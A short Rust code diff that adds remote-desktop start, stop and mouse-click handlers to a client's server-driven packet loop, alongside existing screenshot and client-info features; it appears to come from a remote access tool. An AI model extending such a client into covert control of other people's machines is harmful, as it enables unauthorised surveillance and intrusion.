@@ -1,5 +1,5 @@
 use crate::features::other::{take_screenshot, client_info};
-
+use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click};
 use common::async_impl::packets::*;
 use rand_chacha::ChaCha20Rng;
 use tokio::sync::oneshot;
@@ -58,6 +58,18 @@ pub async fn reading_loop(
                 println!("Server requested reconnection. Reconnecting...");
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
+            }
+
+            Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => {
+                start_remote_desktop(config);
+            }
+
+            Ok(Some(ClientboundPacket::StopRemoteDesktop)) => {
+                stop_remote_desktop();
+            }
+
+            Ok(Some(ClientboundPacket::MouseClick(click_data))) => {
+                mouse_click(click_data);
             }
 
             Ok(Some(p)) => {
